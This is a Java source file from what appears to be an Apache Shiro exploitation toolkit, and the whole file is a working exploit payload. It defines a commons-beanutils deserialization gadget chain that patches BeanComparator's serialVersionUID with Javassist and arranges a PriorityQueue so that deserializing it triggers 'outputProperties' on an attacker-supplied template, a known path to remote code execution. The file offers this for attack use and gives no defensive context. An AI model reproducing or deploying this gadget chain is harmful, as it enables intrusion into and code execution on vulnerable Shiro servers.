package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.JavassistClassLoader;
import com.sma11new.exp.shiro.attack.util.Reflections;
import javassist.*;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.6.1"})
@Authors(value={"phith0n"})
public class CommonsBeanutilsString_192s
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass beanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = beanComparator.getDeclaredField("serialVersionUID");
            beanComparator.removeField(ctSUID);
        } catch (NotFoundException ctSUID) {
            // empty catch block
        }
        beanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", beanComparator));
        Comparator comparator = (Comparator)beanComparator.toClass(new JavassistClassLoader()).newInstance();
        beanComparator.defrost();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        String baseString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String pass = RandomUtil.randomString(baseString, 2);
        queue.add(pass);
        queue.add(pass);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }

    public static void main(String[] args) throws Exception {
        CommonsBeanutilsString_192s commonsBeanutilsString192 = new CommonsBeanutilsString_192s();
        commonsBeanutilsString192.getObject(new Object());
    }
}

